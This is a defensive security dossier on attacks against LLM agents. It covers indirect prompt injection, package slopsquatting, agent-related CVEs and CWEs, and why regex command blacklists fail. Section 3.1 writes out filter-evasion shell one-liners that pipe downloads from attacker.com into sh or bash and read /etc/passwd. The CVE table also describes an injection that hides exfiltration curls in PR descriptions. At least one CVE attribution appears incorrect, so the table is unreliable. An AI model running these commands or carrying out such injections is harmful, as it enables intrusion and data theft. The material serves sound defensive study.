# Dossier 03: Adversarial Threat Vectors & Security Vulnerabilities

## 1. Academic Groundwork & Empirical CVEs

### 1.1 Landmark Research Papers
- **Greshake et al. (2023)**: *"Not what you've signed up for: Compromising Real-World LLM-Integrated Applications with Indirect Prompt Injection"*.
  - *Core Finding*: Untrusted third-party data ingested by an LLM (webpages, repositories, issues, log output) can hijack the instruction stream, blending data plane into control plane.
- **Lanyado (Vulcan Cyber, 2023-2024)**: *"AI Package Hallucination / Slopsquatting"*.
  - *Core Finding*: Over 20% of generated package recommendations in Python and Node.js codebases reference non-existent libraries. Adversaries register these names on PyPI/npm with malicious pre-install scripts (`setup.py` / `package.json:scripts.preinstall`) to achieve zero-click code execution on developer machines and CI runners.

### 1.2 Representative CVEs in Agentic & Tool-Calling Systems
| CVE / Advisory | Vulnerability Description | Systems Root Cause |
| :--- | :--- | :--- |
| **CVE-2023-36258** | LangChain `PalChain` Arbitrary Code Execution | Unsanitized LLM text output directly evaluated via Python `exec()` / subshell. |
| **CVE-2023-38039** | AutoGPT Arbitrary File Read & Command Execution | Inadequate path traversal checks and insufficient command filtering in docker runner. |
| **CVE-2024-21513** | LangChain Experimental Shell Tool Injection | Absence of AST validation; shell meta-characters (`&`, `|`, `;`) allowed arbitrary command chaining. |
| **CVE-2024-5184** | Email/Issue Ingestion Prompt Hijacking | LLM assistant parsing GitHub PR descriptions extracted hidden CSS/markdown comments containing exfiltration curls. |

---

## 2. Common Weakness Enumeration (CWE) Taxonomy for Agent Runtimes

1. **CWE-78: Improper Neutralization of Special Elements used in an OS Command ('OS Command Injection')**
   - *Manifestation in Agents*: Model constructs shell commands by interpolating untrusted filenames, git commit messages, or error strings into a shell string without parameterization.
2. **CWE-200: Exposure of Sensitive Information to an Unauthorized Actor**
   - *Manifestation in Agents*: Ambient host environment variables (`AWS_ACCESS_KEY_ID`, `OPENAI_API_KEY`, `GITHUB_TOKEN`) printed into agent stdout or captured in tool outputs sent back to public LLM API endpoints.
3. **CWE-250: Execution with Unnecessary Privileges**
   - *Manifestation in Agents*: Running agent harnesses as `root` or as the developer's primary desktop user with access to `~/.ssh/id_rsa`, `~/.aws/credentials`, and the local Docker daemon socket (`/var/run/docker.sock`).
4. **CWE-403: Exposure of File Descriptor to Intended Control Sphere**
   - *Manifestation in Agents*: Supervisor processes leaking open database connections, management pipes, or parent socket pairs to untrusted agent subshells due to missing `O_CLOEXEC`.

---

## 3. Shell Filter Evasion Mechanics (Why Regex Blacklists Fail)

A standard developer mistake is attempting to sanitize shell commands using regular expressions (e.g. blocking `curl`, `rm -rf`, `wget`). In POSIX shells, syntax evasion makes regex blacklists mathematically intractable.

### 3.1 Evasion Techniques That Bypass Regex Blacklists:
- **Variable Interpolation**:
  ```bash
  CMD="cu"; CMD2="rl"; $CMD$CMD2 http://attacker.com/malware | sh
  ```
- **Internal Field Separator (`$IFS`) Manipulation**:
  ```bash
  cat$IFS/etc/passwd
  ```
- **Quoting and Escaping**:
  ```bash
  c'u'r'l http://attacker.com
  c\u\r\l http://attacker.com
  /usr/bin/c""url http://attacker.com
  ```
- **Base64 / Hex Decoding Pipelines**:
  ```bash
  echo Y3VybCBhdHRhY2tlci5jb20= | base64 -d | bash
  ```
- **Wildcard Path Expansion**:
  ```bash
  /???/???l http://attacker.com   # Matches /bin/curl or /usr/bin/curl
  ```

### 3.2 System Invariant Conclusion
> **Blacklisting commands via regular expressions is provably ineffective in POSIX shells.**  
> Authorization must occur via:
> 1. **Concrete Abstract Syntax Tree (AST) parsing** (`bash-parser` or `libtree-sitter-bash`).
> 2. **Deterministic kernel-level binary interception** (`execve` filtering via seccomp or Landlock).
> 3. **Elimination of ambient authority** (`env -i`, network namespace drop).
